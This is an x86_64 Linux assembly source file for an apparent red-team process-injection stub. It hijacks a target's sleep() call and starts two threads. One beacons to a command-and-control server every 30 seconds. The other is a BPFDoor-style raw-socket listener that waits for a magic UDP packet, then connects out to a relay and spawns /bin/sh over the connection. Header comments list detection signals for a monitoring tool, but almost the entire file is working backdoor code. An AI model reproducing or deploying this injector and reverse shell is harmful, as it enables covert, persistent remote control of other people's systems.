; inject_stub.asm   x86_64 Linux process injection stub (Fase 3: passive raw socket C2)
; NASM syntax. Build with: nasm -f bin -o stub.bin stub.asm
;
; BLOB LAYOUT:
;
;   +0x000  [8]  spawned_flag   0 = not yet spawned; 1 = spawned (set via mprotect+write)
;   +0x008  [4]  c2_ip          IPv4 in network byte order                  ← patched
;   +0x00C  [2]  c2_port        TCP port in network byte order              ← patched
;   +0x00E  [2]  _pad
;   +0x010  [8]  thread_stack   UNUSED at runtime (same reason)
;   +0x018  [8]  trampoline_target  resolved VA of real sleep()             ← patched
;   +0x020  [8]  magic_key      8-byte shared key for rawsock validation    ← patched
;   +0x028  [4]  rawsock_cb_ip  relay direct IPv4 NBO   rawsock callback IP ← patched
;   +0x02C  [2]  rawsock_cb_port relay callback port NBO (9443)             ← patched
;   +0x02E  [0x62] padding
;   +0x090  [CODE] hook_entry
;              Spawns two threads: beacon (TCP periodic) + rawsock (BPFDoor passive).
;              Then trampolines to original sleep().
;   +0x???  [CODE] .beacon_entry
;              Loop: TCP connect → 0xBA byte → close → nanosleep(30s).
;   +0x???  [CODE] .rawsock_entry
;              Loop: AF_PACKET raw socket → parse Eth/IP/UDP → match magic_key →
;              TCP connect to sender:port → fork → dup2 + execve /bin/sh.
;   +end    sh_path  "/bin/sh\0"
;
; MAGIC PACKET FORMAT (UDP, any destination port):
;   bytes [0:8]   = magic_key   (8 bytes   must match blob+0x020)
;
; Callback IP:port are baked into the blob (+0x028/+0x02C)   relay direct IP:9443.
; Packet source IP is irrelevant   bat-server may be on a different network (I-01 model).
;
; DETECTION SURFACE (for Aura v5):
;   - openat("/proc/PID/mem") with write flags
;   - process_vm_writev (SYS 311)
;   - clone(CLONE_VM|CLONE_THREAD) from non-child process
;   - socket(AF_PACKET, SOCK_RAW, ...) in non-network process
;   - fork() + execve inside a daemon

bits 64

;  DATA HEADER                                                              
blob_start:
spawned_flag:       dq 0                        ; +0x000  unused
c2_ip:              dd 0                        ; +0x008  IPv4 NBO (patched)
c2_port:            dw 0                        ; +0x00C  port NBO (patched)
                    dw 0                        ; +0x00E  padding
thread_stack:       dq 0                        ; +0x010  unused
trampoline_target:  dq 0                        ; +0x018  patched by injector
magic_key:          dq 0                        ; +0x020  8-byte key (patched)
rawsock_cb_ip:      dd 0                        ; +0x028  callback IPv4 NBO (relay direct IP, patched)
rawsock_cb_port:    dw 0                        ; +0x02C  callback port NBO (patched)
                    times (0x090 - 0x02E) db 0  ; +0x02E..+0x08F padding

;  HOOK ENTRY                                                              
; Runs at INJECT_BASE+0x090 when target calls sleep() via our GOT overwrite.
; Spawns beacon thread + rawsock thread, then trampolines to real sleep().
;
; Register map across the hook_entry body (caller-saves pushed; restored before jmp):
;   rbx = blob_start (RIP-relative)
;   r12 = beacon stack top (mmap_base + 0xF000)
;   r15 = rawsock stack top (second mmap_base + 0xF000)

hook_entry:                                     ; = +0x090
    push    rax
    push    rcx
    push    rdx
    push    rsi
    push    rdi
    push    r8
    push    r9
    push    r10
    push    r11
    push    rbx
    push    rbp
    push    r12
    push    r13
    push    r14
    push    r15
    sub     rsp, 8              ; re-align: 15 pushes × 8 = 120 bytes → +8 = 128

    lea     rbx, [rel blob_start]   ; rbx = INJECT_BASE

    ;  Spawned guard   prevent thread explosion                              
    ; spawned_flag is at blob+0x000. The code cave is r-xp, so we cannot write
    ; it directly. On first entry: mprotect the cave page to RWX, set the flag.
    ; On all subsequent calls: flag=1 → skip spawn, just trampoline to real sleep().
    ; This ensures exactly one beacon + one rawsock thread are ever spawned.
    cmp     byte [rbx], 1
    je      .trampoline             ; already spawned   forward to real sleep()

    ; mprotect(page_base(rbx), 4096, PROT_READ|PROT_WRITE|PROT_EXEC=7)
    ; Stays RWX permanently   acceptable for lab; avoids a second mprotect call.
    mov     rdi, rbx
    and     rdi, -4096              ; page-align (AND with 0xFFFFFFFFFFFFF000)
    mov     rsi, 4096
    mov     rdx, 7                  ; PROT_READ|PROT_WRITE|PROT_EXEC
    mov     rax, 10                 ; SYS_mprotect
    syscall                         ; ignore return   failure is non-fatal

    mov     byte [rbx], 1           ; spawned_flag = 1

    ;  Beacon thread stack                                                  
    ; mmap(NULL, 64KB, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0)
    mov     rax, 9
    xor     rdi, rdi
    mov     rsi, 0x10000
    mov     rdx, 3
    mov     r10, 0x20022
    mov     r8d, -1
    xor     r9, r9
    syscall

    test    rax, rax
    js      .trampoline             ; mmap failed   skip both threads

    mov     r12, rax
    add     r12, 0xF000             ; r12 = beacon stack top (4KB guard at bottom)

    ; Pass C2 config below child's initial RSP (readable on thread's stack)
    mov     eax, dword [rbx + 0x008]    ; c2_ip
    mov     dword [r12 - 0x020], eax
    mov     ax,  word  [rbx + 0x00C]    ; c2_port
    mov     word  [r12 - 0x01C], ax

    ; clone(CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM,
    ;        r12, NULL, NULL, 0)   flags = 0x50F00
    mov     rax, 56
    mov     rdi, 0x50F00
    mov     rsi, r12
    xor     rdx, rdx
    xor     r10, r10
    xor     r8,  r8
    syscall

    test    rax, rax
    jz      .beacon_entry           ; child → beacon loop
    js      .trampoline             ; clone error → skip rawsock

    ;  Rawsock thread stack                                                  
    mov     rax, 9
    xor     rdi, rdi
    mov     rsi, 0x10000
    mov     rdx, 3
    mov     r10, 0x20022
    mov     r8d, -1
    xor     r9,  r9
    syscall

    test    rax, rax
    js      .trampoline             ; mmap failed   rawsock unavailable

    add     rax, 0xF000
    mov     r15, rax                ; r15 = rawsock stack top

    ; clone rawsock thread (same flags)
    mov     rax, 56
    mov     rdi, 0x50F00
    mov     rsi, r15
    xor     rdx, rdx
    xor     r10, r10
    xor     r8,  r8
    syscall

    test    rax, rax
    jz      .rawsock_entry          ; child → rawsock listener

    ; parent (or clone error)   fall through to trampoline

.trampoline:
    add     rsp, 8
    pop     r15
    pop     r14
    pop     r13
    pop     r12
    pop     rbp
    pop     rbx
    pop     r11
    pop     r10
    pop     r9
    pop     r8
    pop     rdi
    pop     rsi
    pop     rdx
    pop     rcx
    pop     rax
    jmp     [rel trampoline_target] ; indirect 6-byte JMP   no ±2GB limit

;  BEACON ENTRY                                                            
; Child thread: RSP = r12 (beacon stack top). C2 config at [rsp-0x020].

.beacon_entry:
    mov     r13d, dword [rsp - 0x020]   ; c2_ip (NBO)
    xor     r14,  r14
    mov     r14w, word  [rsp - 0x01C]   ; c2_port (NBO)

.beacon_loop:
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    test    rax, rax
    js      .b_sleep

    mov     r12, rax                ; r12 = sockfd

    sub     rsp, 16
    xor     eax, eax
    mov     qword [rsp],     rax
    mov     qword [rsp + 8], rax
    mov     word  [rsp],     2          ; AF_INET
    mov     word  [rsp + 2], r14w       ; sin_port (NBO)
    mov     dword [rsp + 4], r13d       ; sin_addr (NBO)

    ; connect(sockfd, &addr, 16)
    mov     rax, 42
    mov     rdi, r12
    mov     rsi, rsp
    mov     rdx, 16
    syscall
    add     rsp, 16

    test    rax, rax
    jnz     .b_close

    ; write(sockfd, 0xBA, 1)
    sub     rsp, 1
    mov     byte [rsp], 0xBA
    mov     rax, 1
    mov     rdi, r12
    mov     rsi, rsp
    mov     rdx, 1
    syscall
    add     rsp, 1

.b_close:
    mov     rax, 3
    mov     rdi, r12
    syscall

.b_sleep:
    ; nanosleep({30, 0}, NULL)
    sub     rsp, 16
    mov     qword [rsp],     30
    mov     qword [rsp + 8], 0
    mov     rax, 35
    mov     rdi, rsp
    xor     rsi, rsi
    syscall
    add     rsp, 16

    jmp     .beacon_loop

;  RAWSOCK ENTRY                                                            
; BPFDoor-style passive C2: AF_PACKET raw socket listens for magic packet.
; No open TCP/UDP ports   invisible to ss/netstat.
;
; Magic packet (UDP, any destination):
;   payload[0:8]  = magic_key  (8 bytes   must match blob+0x020)
;
; On match: TCP connect to blob.rawsock_cb_ip:blob.rawsock_cb_port →
;   fork → dup2(0/1/2) → execve /bin/sh
;
; Callback address is BAKED into blob (+0x028/+0x02C)   relay direct IP:port.
; This allows the magic packet to be sent from any source (bat-server local)
; while the reverse connection goes to the relay (same VPC as target).
;
; Register map (rawsock thread, all registers free):
;   rbx  = blob_start
;   r12  = raw_fd (AF_PACKET socket)
;   r13  = packet receive buffer base (rsp after sub rsp,2048)
;   r14  = UDP header start (per packet)
;   r15  = callback IPv4 (from blob rawsock_cb_ip, NBO)
;   r8   = callback port (from blob rawsock_cb_port, NBO)
;   r11  = connect_fd (per trigger)

.rawsock_entry:
    lea     rbx, [rel blob_start]

    ; Receive buffer: 2048 bytes on stack (stays allocated for thread lifetime)
    sub     rsp, 2048
    mov     r13, rsp                ; r13 = packet buffer

    ; socket(AF_PACKET=17, SOCK_RAW=3, htons(ETH_P_ALL)=0x0300)
    ; htons(ETH_P_ALL=0x0003) = 0x0300 on little-endian
    mov     rax, 41
    mov     rdi, 17
    mov     rsi, 3
    mov     rdx, 0x0300
    syscall

    test    rax, rax
    js      .rs_exit                ; no CAP_NET_RAW or other error   give up

    mov     r12, rax                ; r12 = raw_fd

.rs_loop:
    ; recvfrom(raw_fd, buf, 2048, 0, NULL, NULL)    blocking
    mov     rax, 45
    mov     rdi, r12
    mov     rsi, r13
    mov     rdx, 2048
    xor     r10d, r10d              ; flags = 0
    xor     r8,   r8                ; src_addr = NULL
    xor     r9,   r9                ; addrlen = NULL
    syscall

    ; Minimum frame: 14 (Eth) + 20 (IP) + 8 (UDP) + 10 (payload) = 52 bytes
    ; jl handles both errors (negative, signed < 52) and truncated frames
    cmp     rax, 52
    jl      .rs_loop

    ;  Ethernet: Ethertype must be IPv4 (0x0800)                            
    ; Bytes [12:14] in frame = Ethertype. On LE: [0x08,0x00] → word = 0x0008
    movzx   ecx, word [r13 + 12]
    cmp     ecx, 0x0008
    jne     .rs_loop

    ;  IP: protocol must be UDP (17 = 0x11)                                
    ; IP header starts at r13+14. Protocol byte is at offset 9 → frame offset 23.
    movzx   ecx, byte [r13 + 23]
    cmp     ecx, 17
    jne     .rs_loop

    ;  IP header length: lower nibble of first IP byte × 4                  
    movzx   ecx, byte [r13 + 14]
    and     ecx, 0x0F
    shl     ecx, 2                  ; ecx = IHL in bytes (typically 20)
    lea     r14, [r13 + 14]
    add     r14, rcx                ; r14 = UDP header start

    ;  UDP payload: bytes [0:8] must equal magic_key                        
    ; UDP header = 8 bytes; payload starts at r14+8
    mov     rax, qword [r14 + 8]    ; first 8 payload bytes (raw, LE word)
    mov     rcx, qword [rbx + 0x020]; magic_key (patched, same raw layout)
    cmp     rax, rcx
    jne     .rs_loop

    ;  Extract callback address from blob (baked relay IP + port)          
    ; Using baked values allows magic packet to be sent from any source:
    ; bat-server (local) → target public IP → rawsock validates key →
    ; callback to relay direct IP:9443 → SSH tunnel → bat-server local.
    mov     r15d, dword [rbx + 0x028] ; rawsock_cb_ip (relay direct IPv4, NBO)
    movzx   r8d,  word  [rbx + 0x02C] ; rawsock_cb_port (baked port, NBO)

    ;  Reverse TCP connection                                                
    ; socket(AF_INET=2, SOCK_STREAM=1, 0)
    mov     rax, 41
    mov     rdi, 2
    mov     rsi, 1
    xor     rdx, rdx
    syscall
    test    rax, rax
    js      .rs_loop                ; socket failed   retry on next packet

    mov     r11, rax                ; r11 = connect_fd

    ; sockaddr_in: AF_INET(2) | sin_port | sin_addr | pad
    sub     rsp, 16
    xor     eax, eax
    mov     qword [rsp],     rax
    mov     qword [rsp + 8], rax
    mov     word  [rsp],     2          ; AF_INET
    mov     word  [rsp + 2], r8w        ; sin_port (NBO, from packet)
    mov     dword [rsp + 4], r15d       ; sin_addr (NBO, packet src IP)

    mov     rax, 42
    mov     rdi, r11
    mov     rsi, rsp
    mov     rdx, 16
    syscall
    add     rsp, 16

    test    rax, rax
    jnz     .rs_close               ; connect failed   close socket, continue loop

    ;  fork → dup2 → execve /bin/sh                                        
    ; fork() creates a child process inheriting the connection fd.
    ; Child executes the shell; parent closes its copy and keeps listening.
    mov     rax, 57                 ; SYS_fork
    syscall
    test    rax, rax
    jnz     .rs_close               ; parent (rax=child_pid) or fork error → close + loop

    ; CHILD (rax=0): stdio → connect_fd, then execve /bin/sh
    ; dup2(r11, 0)   stdin
    mov     rdi, r11
    xor     rsi, rsi
    mov     rax, 33
    syscall
    ; dup2(r11, 1)   stdout
    mov     rdi, r11
    mov     rsi, 1
    mov     rax, 33
    syscall
    ; dup2(r11, 2)   stderr
    mov     rdi, r11
    mov     rsi, 2
    mov     rax, 33
    syscall

    ; execve("/bin/sh", ["/bin/sh", NULL], NULL)
    ; argv[] built on stack (writable); pathname from code cave (r-xp = readable OK)
    lea     rdi, [rel sh_path]      ; pathname = "/bin/sh\0" in blob
    sub     rsp, 16
    lea     rax, [rel sh_path]
    mov     [rsp],     rax          ; argv[0] = &sh_path
    mov     qword [rsp + 8], 0      ; argv[1] = NULL
    mov     rsi, rsp                ; argv
    xor     rdx, rdx                ; envp = NULL
    mov     rax, 59
    syscall

    ; execve failed (should not happen with /bin/sh present)   child exits cleanly
    mov     rax, 60                 ; SYS_exit (NOT SYS_exit_group   don't kill cron)
    xor     rdi, rdi
    syscall

.rs_close:
    ; Parent: close our copy of connect_fd. Child (if forked) has its own.
    mov     rax, 3
    mov     rdi, r11
    syscall
    jmp     .rs_loop

.rs_exit:
    ; Thread exit   socket() failed (e.g. CAP_NET_RAW denied). Exit cleanly.
    mov     rax, 60                 ; SYS_exit
    xor     rdi, rdi
    syscall

;  STRING DATA                                                              
; In the code cave (r-xp). Readable for execve pathname arg. NOT written at runtime.
sh_path: db "/bin/sh", 0
